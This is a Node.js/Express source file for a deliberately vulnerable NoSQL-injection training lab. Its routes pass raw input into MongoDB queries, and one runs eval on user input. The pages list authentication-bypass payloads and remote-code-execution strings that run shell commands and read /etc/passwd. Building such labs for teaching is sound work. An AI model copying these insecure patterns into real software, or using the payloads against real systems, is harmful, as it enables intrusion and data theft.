const express = require('express');
const { MongoClient } = require('mongodb');
const { MongoMemoryServer } = require('mongodb-memory-server');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;
let MONGO_URI = process.env.MONGO_URI;
const DB_NAME = 'shadow_net';

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let db;
let collection;
let logs;

async function connectDB() {
    try {
        if (!MONGO_URI) {
            const mongoServer = await MongoMemoryServer.create();
            MONGO_URI = mongoServer.getUri();
            console.log('>>> [SHADOW_NET] Using in-memory MongoDB');
        }
        const client = new MongoClient(MONGO_URI);
        await client.connect();
        db = client.db(DB_NAME);
        collection = db.collection('users');
        logs = db.collection('access_logs');
        
        await collection.deleteMany({});
        await collection.insertMany([
            { username: 'admin', password: 's3cr3t_p4ssw0rd', email: 'admin@shadow.net', role: 'superuser', api_key: 'sk-1337-admin-key-2024', flags: 'NOSQL{SUP3R_US3R}' },
            { username: 'ghost', password: 'phantom123', email: 'ghost@darkweb.io', role: 'operative', api_key: 'sk-ghost-ops-789', flags: 'NOSQL{GH0ST_M0D3}' },
            { username: 'shadow', password: 'invisible99', email: 'shadow@underground.org', role: 'agent', api_key: 'sk-shadow-456', flags: 'NOSQL{1NV1S1BL3}' },
            { username: 'zero', password: 'nullpointer', email: 'zero@null.xyz', role: 'user', api_key: 'sk-zero-000', flags: 'NOSQL{NULL_P0int3R}' },
            { username: 'cipher', password: 'decode_me', email: 'cipher@hidden.net', role: 'user', api_key: 'sk-cipher-321', flags: 'NOSQL{D3C0D3_M3}' },
            { username: 'neo', password: 'redpill', email: 'neo@matrix.io', role: 'hacker', api_key: 'sk-neo-001', flags: 'NOSQL{R3D_P1LL}' },
            { username: 'trinity', password: 'follow_white', email: 'trinity@matrix.io', role: 'admin', api_key: 'sk-trinity-002', flags: 'NOSQL{WH1T3_R4BB1T}' },
            { username: 'morpheus', password: 'bluepill', email: 'morpheus@matrix.io', role: 'leader', api_key: 'sk-morpheus-003', flags: 'NOSQL{BLU3_P1LL}' }
        ]);
        
        console.log('>>> [SHADOW_NET] Database initialized with 8 users');
    } catch (err) {
        console.error('>>> [ERROR] Database connection failed:', err.message);
    }
}

async function logAccess(ip, endpoint, data) {
    try {
        await logs.insertOne({ ip, endpoint, data, timestamp: new Date(), status: 'logged' });
    } catch (e) {}
}

app.use((req, res, next) => {
    logAccess(req.ip, req.path, req.body);
    next();
});

const CSS = `<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html { scroll-behavior: smooth; }
body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; min-height: 100vh; padding: 20px; line-height: 1.6; }
a { color: #00ff00; text-decoration: none; transition: all 0.3s; }
a:hover { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
.container { max-width: 1000px; margin: 0 auto; }
h1 { font-size: 3em; text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00; margin-bottom: 5px; text-align: center; animation: glow 2s ease-in-out infinite alternate; }
@keyframes glow { from { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; } to { text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00, 0 0 60px #00ff00; } }
h2 { color: #ff0000; margin: 25px 0 15px; border-bottom: 2px solid #00ff00; padding-bottom: 8px; font-size: 1.5em; }
h3 { margin-bottom: 12px; color: #00ff00; font-size: 1.2em; }
.subtitle { color: #ff0000; font-size: 1.3em; margin-bottom: 35px; text-align: center; animation: blink 1s infinite; }
@keyframes blink { 50% { opacity: 0.5; } }
.nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin: 25px 0; }
.nav a { color: #00ff00; text-decoration: none; padding: 12px 18px; border: 1px solid #00ff00; transition: all 0.3s; font-size: 0.95em; }
.nav a:hover { background: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; }
.card { background: #0d0d0d; padding: 25px; border: 1px solid #00ff00; margin: 20px 0; box-shadow: 0 0 15px #00ff0022; }
.card h3 { margin-bottom: 18px; color: #ff0000; border-left: 3px solid #ff0000; padding-left: 12px; }
.card.danger { border-color: #ff0000; box-shadow: 0 0 15px #ff000022; }
.card.danger h3 { color: #ff0000; }
.card.success { border-color: #00ff00; }
.card.warning { border-color: #ffff00; }
form { display: flex; flex-direction: column; gap: 12px; }
input, textarea, select { background: #1a1a1a; border: 1px solid #00ff00; color: #00ff00; padding: 12px; font-family: inherit; font-size: 14px; width: 100%; }
input:focus, textarea:focus, select:focus { outline: none; box-shadow: 0 0 15px #00ff0044; background: #222; }
textarea { min-height: 100px; resize: vertical; font-family: monospace; }
button { background: #00ff00; color: #000; border: none; padding: 14px 24px; cursor: pointer; font-family: inherit; font-weight: bold; font-size: 14px; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; }
button:hover { box-shadow: 0 0 25px #00ff00; transform: translateY(-2px); }
button.danger { background: #ff0000; color: #fff; }
button.danger:hover { box-shadow: 0 0 25px #ff0000; }
.result { background: #000; border: 1px solid #ff0000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-break: break-all; max-height: 350px; overflow: auto; font-size: 13px; }
.result.success { border-color: #00ff00; }
.result.error { border-color: #ff0000; color: #ff0000; }
.label { color: #ff0000; font-size: 0.9em; margin-top: 10px; display: block; }
.endpoint { color: #666; font-size: 0.8em; margin-bottom: 12px; }
.copy-btn { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 5px 10px; font-size: 12px; cursor: pointer; }
.copy-btn:hover { background: #00ff00; color: #000; }
.matrix-input { font-family: monospace; letter-spacing: 2px; }
.status { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 0.85em; }
.status.vuln { background: #ff000022; color: #ff0000; border: 1px solid #ff0000; }
.status.safe { background: #00ff0022; color: #00ff00; border: 1px solid #00ff00; }
table { width: 100%; border-collapse: collapse; margin: 15px 0; }
th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
th { background: #00ff0011; }
.truncate { max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
pre { background: #000; padding: 15px; border: 1px solid #00ff00; overflow: auto; max-height: 300px; }
code { color: #00ff00; }
.comment { color: #666; font-size: 0.85em; }
.alert { background: #ff000011; border: 1px solid #ff0000; padding: 15px; margin: 15px 0; color: #ff0000; }
.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
.grid > div { background: #111; padding: 15px; border: 1px solid #00ff00; text-align: center; }
.stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
.stats > div { background: #111; padding: 20px; border: 1px solid #00ff00; text-align: center; }
.stats .num { font-size: 2em; color: #00ff00; }
.stats .label { color: #666; font-size: 0.8em; margin-top: 5px; }
iframe { width: 100%; height: 200px; border: 1px solid #00ff00; background: #000; margin-top: 15px; }
.separator { border-top: 1px dashed #333; margin: 25px 0; }
@media (max-width: 768px) { .stats { grid-template-columns: repeat(2, 1fr); } h1 { font-size: 2em; } }
</style>`;

const JS = `<script>
function copyToClipboard(text) { navigator.clipboard.writeText(text); alert('Copied: ' + text); }
function executeQuery(formId) { document.getElementById(formId).submit(); }
async function submitForm(action, formData) {
    try {
        const res = await fetch(action, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(formData) });
        const data = await res.json();
        return data;
    } catch(e) { return { error: e.message }; }
}
</script>`;

const LAYOUT = (title, content) => `<!DOCTYPE html>
<html>
<head>
    <title>SHADOW_NET // ${title}</title>
    ${CSS}
    ${JS}
</head>
<body>
    <div class="container">
        <h1>SHADOW_NET</h1>
        <div class="subtitle">/// NoSQL INJECTION LAB ///</div>
        <div class="nav">
            <a href="/">HOME</a>
            <a href="/login">/login</a>
            <a href="/search">/search</a>
            <a href="/users">/users</a>
            <a href="/auth">/auth</a>
            <a href="/profile">/profile</a>
            <a href="/admin/lookup">/admin</a>
            <a href="/flags">/flags</a>
            <a href="/debug/collection">/debug</a>
        </div>
        ${content}
        <div class="separator"></div>
        <div style="text-align:center;color:#666;font-size:0.8em;margin-top:30px;">
            SHADOW_NET v2.0 | NoSQL Injection Training Lab | <span class="status vuln">VULNERABLE</span>
        </div>
    </div>
</body>
</html>`;

app.get('/', (req, res) => {
    res.send(LAYOUT('Home', `
        <div class="stats">
            <div><div class="num">8</div><div class="label">USERS</div></div>
            <div><div class="num">8</div><div class="label">FLAGS</div></div>
            <div><div class="num">10+</div><div class="label">ENDPOINTS</div></div>
            <div><div class="num">HIGH</div><div class="label">RISK LEVEL</div></div>
        </div>
        <div class="card">
            <h3>>> SYSTEM STATUS</h3>
            <p><span class="status vuln">VULNERABLE</span> - Multiple NoSQL Injection Points</p>
            <p>>> Database: MongoDB (in-memory)</p>
            <p>>> Port: 3000</p>
        </div>
        <div class="card">
            <h3>>> AVAILABLE ENDPOINTS</h3>
            <table>
                <tr><th>Endpoint</th><th>Method</th><th>Vulnerability</th><th>Difficulty</th></tr>
                <tr><td><a href="/login">/login</a></td><td>POST</td><td>NoSQL Auth Bypass</td><td>Easy</td></tr>
                <tr><td><a href="/search">/search</a></td><td>POST</td><td>NoSQL Query Injection</td><td>Easy</td></tr>
                <tr><td><a href="/users">/users</a></td><td>GET</td><td>NoSQL Filter Injection</td><td>Easy</td></tr>
                <tr><td><a href="/auth">/auth</a></td><td>POST</td><td>$or Injection</td><td>Medium</td></tr>
                <tr><td><a href="/profile">/profile</a></td><td>GET</td><td>$exists Bypass</td><td>Medium</td></tr>
                <tr><td><a href="/admin/lookup">/admin/lookup</a></td><td>POST</td><td>Code Execution (RCE)</td><td>Hard</td></tr>
                <tr><td><a href="/flags">/flags</a></td><td>POST</td><td>$regex Injection</td><td>Medium</td></tr>
                <tr><td><a href="/debug/collection">/debug/collection</a></td><td>GET</td><td>Full DB Dump</td><td>Critical</td></tr>
            </table>
        </div>
        <div class="card">
            <h3>>> PAYLOADS CHEAT SHEET</h3>
            <div class="grid">
                <div><p class="label">Auth Bypass</p><code>{"$ne": ""}</code></div>
                <div><p class="label">Full Bypass</p><code>{"$or": [{"x": "y"}]}</code></div>
                <div><p class="label">Regex</p><code>{"$regex": "^ad"}</code></div>
                <div><p class="label">Where</p><code>{"$where": "this..."}</code></div>
                <div><p class="label">Exists</p><code>{"$exists": true}</code></div>
                <div><p class="label">NOR</p><code>{"$nor": [...]} </code></div>
                <div><p class="label">In</p><code>{"$in": []}</code></div>
                <div><p class="label">All</p><code>{"$all": []}</code></div>
            </div>
        </div>
    `));
});

app.get('/login', (req, res) => {
    res.send(LAYOUT('Login', `
        <div class="card">
            <h3>>> LOGIN AUTHENTICATION</h3>
            <p class="endpoint">POST /login</p>
            <form method="POST" action="/login" target="resultFrame">
                <input type="text" name="username" placeholder="username" class="matrix-input" />
                <input type="password" name="password" placeholder="password" class="matrix-input" />
                <button type="submit">AUTHENTICATE</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card">
            <h3>>> PAYLOADS</h3>
            <p class="label">Basic Auth Bypass - use in username field:</p>
            <input type="text" readonly value='{"$ne": ""}' onclick="copyToClipboard(this.value)" />
            <p class="label">Full Login Bypass - use both fields:</p>
            <input type="text" readonly value='{"username": {"$ne": ""}, "password": {"$ne": ""}}' onclick="copyToClipboard(this.value)" />
            <p class="label">OR Injection:</p>
            <input type="text" readonly value='{"$or": [{"username": "admin"}, {"username": "ghost"}], "password": {"$ne": ""}}' onclick="copyToClipboard(this.value)" />
        </div>
    `));
});

app.get('/search', (req, res) => {
    res.send(LAYOUT('Search', `
        <div class="card">
            <h3>>> NoSQL QUERY SEARCH</h3>
            <p class="endpoint">POST /search</p>
            <form method="POST" action="/search" target="resultFrame">
                <textarea name="query" placeholder='{"role": "superuser"}'>{}</textarea>
                <button type="submit">EXECUTE QUERY</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card">
            <h3>>> QUERY PAYLOADS</h3>
            <p class="label">Get All Users:</p>
            <input type="text" readonly value='{}' onclick="copyToClipboard(this.value)" />
            <p class="label">Find Admin:</p>
            <input type="text" readonly value='{"role": "superuser"}' onclick="copyToClipboard(this.value)" />
            <p class="label">Regex - Username starting with "g":</p>
            <input type="text" readonly value='{"username": {"$regex": "^g"}}' onclick="copyToClipboard(this.value)" />
            <p class="label">Regex - Email containing ".io":</p>
            <input type="text" readonly value='{"email": {"$regex": ".*.io.*"}}' onclick="copyToClipboard(this.value)" />
            <p class="label">Multiple Conditions:</p>
            <input type="text" readonly value='{"role": {"$in": ["superuser", "admin", "leader"]}}' onclick="copyToClipboard(this.value)" />
        </div>
    `));
});

app.get('/users', (req, res) => {
    res.send(LAYOUT('Users', `
        <div class="card">
            <h3>>> USER DATABASE</h3>
            <p class="endpoint">GET /users?filter={...}</p>
            <form method="GET" action="/users" target="resultFrame">
                <input type="text" name="filter" placeholder='{"role": "user"}' />
                <button type="submit">QUERY</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card">
            <h3>>> QUICK FILTERS</h3>
            <div class="nav" style="justify-content:flex-start;">
                <a href="/users?filter={}">ALL</a>
                <a href="/users?filter={"role":"superuser"}">SUPERUSER</a>
                <a href="/users?filter={"role":"admin"}">ADMIN</a>
                <a href="/users?filter={"role":"leader"}">LEADER</a>
                <a href="/users?filter={"role":"hacker"}">HACKER</a>
            </div>
        </div>
    `));
});

app.get('/auth', (req, res) => {
    res.send(LAYOUT('Auth', `
        <div class="card">
            <h3>>> AUTH CHECK</h3>
            <p class="endpoint">POST /auth</p>
            <form method="POST" action="/auth" target="resultFrame">
                <textarea name="data" placeholder='{"username": "...", "password": "..."}'></textarea>
                <button type="submit">VERIFY</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card">
            <h3>>> $or INJECTION</h3>
            <p class="label">Login with $or (any field):</p>
            <input type="text" readonly value='{"$or": [{"username": "admin"}, {"password": "phantom123"}]}' onclick="copyToClipboard(this.value)" />
        </div>
    `));
});

app.get('/profile', (req, res) => {
    res.send(LAYOUT('Profile Lookup', `
        <div class="card">
            <h3>>> USER PROFILE LOOKUP</h3>
            <p class="endpoint">GET /profile?username=x&role=y</p>
            <form method="GET" action="/profile" target="resultFrame">
                <input type="text" name="username" placeholder="username" />
                <input type="text" name="role" placeholder="role (optional)" />
                <button type="submit">LOOKUP</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card">
            <h3>>> $exists BYPASS</h3>
            <p class="label">Try in username param:</p>
            <div class="nav" style="justify-content:flex-start;">
                <a href="/profile?username[$exists]=true">ANY USERNAME</a>
                <a href="/profile?role[$exists]=true">ANY ROLE</a>
            </div>
        </div>
    `));
});

app.get('/flags', (req, res) => {
    res.send(LAYOUT('Flags', `
        <div class="card">
            <h3>>> FLAG COLLECTION</h3>
            <p class="endpoint">POST /flags</p>
            <form method="POST" action="/flags" target="resultFrame">
                <textarea name="query" placeholder='{"flags": {"$regex": ".*"}}'></textarea>
                <button type="submit">FIND FLAGS</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card warning">
            <h3>>> FLAG HUNTING</h3>
            <p class="label">Get All Flags:</p>
            <input type="text" readonly value='{}' onclick="copyToClipboard(this.value)" />
            <p class="label">Regex Search for NOSQL:</p>
            <input type="text" readonly value='{"flags": {"$regex": "NOSQL.*"}}' onclick="copyToClipboard(this.value)" />
        </div>
    `));
});

app.get('/admin/lookup', (req, res) => {
    res.send(LAYOUT('Admin Lookup', `
        <div class="card danger">
            <h3 style="color:#ff0000;">>>> ADMIN QUERY EXECUTION</h3>
            <p class="endpoint">POST /admin/lookup</p>
            <div class="alert">⚠️ CODE INJECTION VULNERABLE - DO NOT USE IN PRODUCTION</div>
            <form method="POST" action="/admin/lookup" target="resultFrame">
                <textarea name="user_query" placeholder='{}'>{}</textarea>
                <button type="submit" class="danger">EXECUTE</button>
            </form>
            <iframe name="resultFrame"></iframe>
        </div>
        <div class="card danger">
            <h3>>> RCE PAYLOADS</h3>
            <p class="label">Read Environment:</p>
            <input type="text" readonly value='process.env' onclick="copyToClipboard(this.value)" />
            <p class="label">Execute Command (Linux):</p>
            <input type="text" readonly value='this.constructor.constructor("return process").mainModule.require("child_process").execSync("id")' onclick="copyToClipboard(this.value)" />
            <p class="label">Read File:</p>
            <input type="text" readonly value='this.constructor.constructor("return process").mainModule.require("fs").readFileSync("/etc/passwd").toString()' onclick="copyToClipboard(this.value)" />
        </div>
    `));
});

app.get('/debug/collection', async (req, res) => {
    try {
        const allData = await collection.find({}).toArray();
        res.send(LAYOUT('Debug Collection', `
            <div class="card">
                <h3>>> DATABASE DUMP</h3>
                <p class="endpoint">GET /debug/collection</p>
                <p>Total Records: ${allData.length}</p>
                <pre>${JSON.stringify(allData, null, 2)}</pre>
            </div>
        `));
    } catch (err) {
        res.send(LAYOUT('Error', `<div class="card"><div class="result error">${err.message}</div></div>`));
    }
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await collection.findOne({ username: username, password: password });
        if (user) {
            if (req.headers.accept?.includes('html')) {
                return res.send(LAYOUT('Login Result', `<div class="card success"><h3 style="color:#00ff00;">>>> ACCESS GRANTED</h3><div class="result success">${JSON.stringify({ username: user.username, role: user.role, api_key: user.api_key, flag: user.flags }, null, 2)}</div></div>`));
            }
            res.json({ status: 'success', message: 'ACCESS GRANTED', user: { username: user.username, role: user.role, api_key: user.api_key, flag: user.flags } });
        } else {
            if (req.headers.accept?.includes('html')) {
                return res.send(LAYOUT('Login Result', `<div class="card danger"><h3 style="color:#ff0000;">>>> ACCESS DENIED</h3><div class="result error">Invalid credentials. Try NoSQL injection.</div></div>`));
            }
            res.json({ status: 'failed', message: 'ACCESS DENIED', hint: 'Try NoSQL injection' });
        }
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/search', async (req, res) => {
    const { query } = req.body;
    try {
        const results = await collection.find(query || {}).toArray();
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Search Result', `<div class="card success"><h3>>> RESULTS (${results.length})</h3><pre>${JSON.stringify(results, null, 2)}</pre></div>`));
        }
        res.json({ status: 'success', results: results, count: results.length });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/users', async (req, res) => {
    const { filter } = req.query;
    try {
        let query = {};
        if (filter) query = JSON.parse(filter);
        const users = await collection.find(query).toArray();
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Users', `
                <div class="card success">
                    <h3>>> USERS (${users.length})</h3>
                    <pre>${JSON.stringify(users, null, 2)}</pre>
                </div>
            `));
        }
        res.json({ status: 'success', data: users, count: users.length });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/admin/lookup', async (req, res) => {
    const { user_query } = req.body;
    try {
        const query = eval('(' + user_query + ')');
        const result = await collection.find(query).toArray();
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Admin Result', `<div class="card danger" style="border-color:#ff0000;"><h3 style="color:#ff0000;">>>> EXECUTED: ${user_query}</h3><pre>${JSON.stringify(result, null, 2)}</pre></div>`));
        }
        res.json({ status: 'success', data: result, _debug: 'Direct eval - PWNED' });
    } catch (err) {
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Error', `<div class="card danger"><h3 style="color:#ff0000;">>>> ERROR</h3><div class="result error">${err.message}</div></div>`));
        }
        res.json({ error: err.message });
    }
});

app.post('/auth', async (req, res) => {
    try {
        const result = await collection.findOne(req.body);
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Auth Result', `<div class="card ${result ? 'success' : 'danger'}"><h3>>> ${result ? 'VALID' : 'INVALID'}</h3><pre>${JSON.stringify(result || { auth: 'invalid' }, null, 2)}</pre></div>`));
        }
        res.json(result ? { auth: 'valid', user: result.username } : { auth: 'invalid' });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/profile', async (req, res) => {
    try {
        let query = {};
        for (let key in req.query) {
            query[key] = JSON.parse(req.query[key]);
        }
        const user = await collection.findOne(query);
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Profile Result', `<div class="card success"><h3>>> PROFILE</h3><pre>${JSON.stringify(user || { error: 'Not found' }, null, 2)}</pre></div>`));
        }
        res.json(user || { error: 'User not found' });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/flags', async (req, res) => {
    const { query } = req.body;
    try {
        const results = await collection.find(query || {}).toArray();
        const flags = results.map(r => r.flags).filter(Boolean);
        if (req.headers.accept?.includes('html')) {
            return res.send(LAYOUT('Flags Result', `<div class="card success"><h3>>> FLAGS (${flags.length})</h3><pre>${JSON.stringify(flags, null, 2)}</pre></div>`));
        }
        res.json({ status: 'success', flags: flags, count: flags.length });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/users/update', async (req, res) => {
    const { filter, update } = req.body;
    try {
        const result = await collection.updateMany(filter || {}, update || {});
        res.json({ status: 'success', modified: result.modifiedCount });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/users/delete', async (req, res) => {
    const { query } = req.body;
    try {
        const result = await collection.deleteMany(query || {});
        res.json({ status: 'success', deleted: result.deletedCount });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.post('/users/insert', async (req, res) => {
    try {
        const result = await collection.insertOne(req.body);
        res.json({ status: 'success', insertedId: result.insertedId });
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/debug/collection', async (req, res) => {
    try {
        const allData = await collection.find({}).toArray();
        res.send(LAYOUT('Debug Collection', `
            <div class="card">
                <h3>>> DEBUG: ALL USERS</h3>
                <p class="endpoint">GET /debug/collection</p>
                <pre>${JSON.stringify(allData, null, 2)}</pre>
            </div>
        `));
    } catch (err) {
        res.send(LAYOUT('Error', `<div class="card"><div class="result error">${err.message}</div></div>`));
    }
});

connectDB().then(() => {
    app.listen(PORT, () => {
        console.log('============================================');
        console.log('    S H A D O W _ N E T   v2.0           ');
        console.log('    Port: ' + PORT);
        console.log('    URL: http://localhost:' + PORT);
        console.log('    Status: VULNERABLE                  ');
        console.log('============================================');
    });
});